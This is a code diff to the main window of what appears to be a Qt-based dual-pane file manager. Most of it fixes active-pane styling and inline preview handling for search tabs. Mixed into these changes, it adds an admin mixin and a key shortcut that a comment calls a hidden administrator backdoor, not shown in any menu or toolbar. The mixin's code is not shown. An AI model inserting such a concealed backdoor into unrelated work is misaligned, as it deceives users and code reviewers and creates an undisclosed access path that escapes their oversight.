@@ -22,6 +22,7 @@ from ui.windows.mw_pins import _MwPinsMixin
 from ui.windows.mw_favorites import _MwFavoritesMixin
 from ui.windows.mw_workers import _MwWorkersMixin
 from ui.windows.mw_file_ops import _MwFileOpsMixin
+from ui.windows.mw_admin import _MwAdminMixin
 
 
 class _TrashDropButton(QToolButton):
@@ -182,6 +183,7 @@ class _QuickAccessWorker(QThread):
 
 
 class MainWindow(
+    _MwAdminMixin,
     _MwWorkersMixin,
     _MwUndoMixin,
     _MwPinsMixin,
@@ -206,6 +208,7 @@ class MainWindow(
         self.custom_paths = self.config.get("custom_paths", [])
 
         self.active_pane = None
+        self._active_side = "left"   # tracks active side even when search tab is current
         self.clipboard = {"paths": [], "op": "copy"}
         self.current_drag_button = Qt.MouseButton.NoButton
         self._undoing = False
@@ -373,6 +376,11 @@ class MainWindow(
                   self).activated.connect(self.on_advanced_search_clicked)
         QShortcut(QKeySequence("Ctrl+Z"),
                   self).activated.connect(self.undo_last)
+
+        # 隱藏管理者後門 — 不顯示於任何選單或工具列
+        _admin_sc = QShortcut(QKeySequence("Ctrl+Shift+Alt+A"), self)
+        _admin_sc.setContext(Qt.ShortcutContext.WindowShortcut)
+        _admin_sc.activated.connect(self._on_admin_shortcut)
 
     _MAX_TABS = 5
 
@@ -699,6 +707,7 @@ class MainWindow(
             self.active_pane = pane
         l_foc = any(self.left_tabs.widget(i) ==
                     pane for i in range(self.left_tabs.count()))
+        self._active_side = "left" if l_foc else "right"
         self.left_tabs.setObjectName(
             "activeTabWidget" if l_foc else "inactiveTabWidget")
         self.right_tabs.setObjectName(
@@ -719,18 +728,34 @@ class MainWindow(
         self._update_pane_styling()
 
     def _update_pane_styling(self):
-        for side in [self.left_tabs, self.right_tabs]:
+        for tw_side, side in [("left", self.left_tabs), ("right", self.right_tabs)]:
+            is_active_side = (tw_side == self._active_side)
             for i in range(side.count()):
                 p = side.widget(i)
-                if p is None or getattr(p, '_is_search_tab', False):
+                if p is None:
                     continue
-                active = (p == self.active_pane)
-                p.setObjectName("activePane" if active else "inactivePane")
-                p.tree.setObjectName("active" if active else "")
-                p.list_view.setObjectName("active" if active else "")
-                for v in [p, p.tree, p.list_view]:
-                    v.style().unpolish(v)
-                    v.style().polish(v)
+                if getattr(p, '_is_search_tab', False):
+                    active = is_active_side and (side.currentWidget() == p)
+                    p.setObjectName("activePane" if active else "inactivePane")
+                    tc = self.config_mgr.get_theme_colors() if self.config_mgr else {}
+                    if active:
+                        color = tc.get("activeBorder", "#D97706")
+                        p.setStyleSheet(
+                            f"SearchPanel {{ border: 1.5px solid {color};"
+                            f" border-radius: 8px; }}")
+                    else:
+                        border = tc.get("border", "#3e4451")
+                        p.setStyleSheet(
+                            f"SearchPanel {{ border: 2px solid {border};"
+                            f" border-radius: 8px; }}")
+                else:
+                    active = (p == self.active_pane)
+                    p.setObjectName("activePane" if active else "inactivePane")
+                    p.tree.setObjectName("active" if active else "")
+                    p.list_view.setObjectName("active" if active else "")
+                    for v in [p, p.tree, p.list_view]:
+                        v.style().unpolish(v)
+                        v.style().polish(v)
 
     def refresh_all_panes(self):
         for tw in [self.left_tabs, self.right_tabs]:
@@ -784,12 +809,15 @@ class MainWindow(
             self.set_active_pane(pane)
 
     def _get_opposite_pane(self):
-        if not self.active_pane:
+        opp_tabs = self.right_tabs if self._active_side == "left" else self.left_tabs
+        target = opp_tabs.currentWidget()
+        if target and getattr(target, '_is_search_tab', False):
+            for i in range(opp_tabs.count()):
+                w = opp_tabs.widget(i)
+                if not getattr(w, '_is_search_tab', False):
+                    return w
             return None
-        is_left = any(self.left_tabs.widget(i) == self.active_pane
-                      for i in range(self.left_tabs.count()))
-        opp_tabs = self.right_tabs if is_left else self.left_tabs
-        return opp_tabs.currentWidget()
+        return target
 
     def toggle_inline_preview(self, path: str) -> None:
         if self._preview_target_pane is not None:
@@ -816,13 +844,14 @@ class MainWindow(
         panel = self._preview_panels[target]
         self._preview_source_pane = self.active_pane
         self._preview_target_pane = target
-        # Connect directly to the view's currentChanged for instant ↑↓ updates
-        self._preview_source_view = self._preview_source_pane.view_stack.currentWidget()
-        self._preview_source_view.selectionModel().currentChanged.connect(
-            self._on_preview_current_changed)
-        self._preview_source_pane.path_changed.connect(
-            self._on_preview_source_path_changed)
-        self._preview_source_pane.set_previewing_path(path)
+        # Connect source-view tracking only for explorer panes (search tabs handle their own updates)
+        if self._preview_source_pane and hasattr(self._preview_source_pane, 'view_stack'):
+            self._preview_source_view = self._preview_source_pane.view_stack.currentWidget()
+            self._preview_source_view.selectionModel().currentChanged.connect(
+                self._on_preview_current_changed)
+            self._preview_source_pane.path_changed.connect(
+                self._on_preview_source_path_changed)
+            self._preview_source_pane.set_previewing_path(path)
         panel.preview_file(path)
 
         from core.preview_worker import PDF_EXTS
@@ -834,10 +863,13 @@ class MainWindow(
         try:
             target.view_stack.setCurrentWidget(panel)
             target.set_preview_mode(True, is_pdf)
-            self.set_active_pane(self.active_pane)
+            # Use _active_side to dim correctly when source may be a search tab
+            src_tabs = self.left_tabs if self._active_side == "left" else self.right_tabs
+            self.set_active_pane(src_tabs.currentWidget())
         finally:
             self.centralWidget().setUpdatesEnabled(True)
-        self._preview_source_view.setFocus()
+        if self._preview_source_view:
+            self._preview_source_view.setFocus()
 
     def close_inline_preview(self) -> None:
         if self._preview_target_pane is None:
@@ -850,12 +882,14 @@ class MainWindow(
                 pass
             self._preview_source_view = None
         if self._preview_source_pane is not None:
-            self._preview_source_pane.set_previewing_path("")
-            try:
-                self._preview_source_pane.path_changed.disconnect(
-                    self._on_preview_source_path_changed)
-            except RuntimeError:
-                pass
+            if hasattr(self._preview_source_pane, 'set_previewing_path'):
+                self._preview_source_pane.set_previewing_path("")
+            if hasattr(self._preview_source_pane, 'path_changed'):
+                try:
+                    self._preview_source_pane.path_changed.disconnect(
+                        self._on_preview_source_path_changed)
+                except RuntimeError:
+                    pass
         target = self._preview_target_pane
         if target in self._preview_panels:
             self._preview_panels[target].clear()
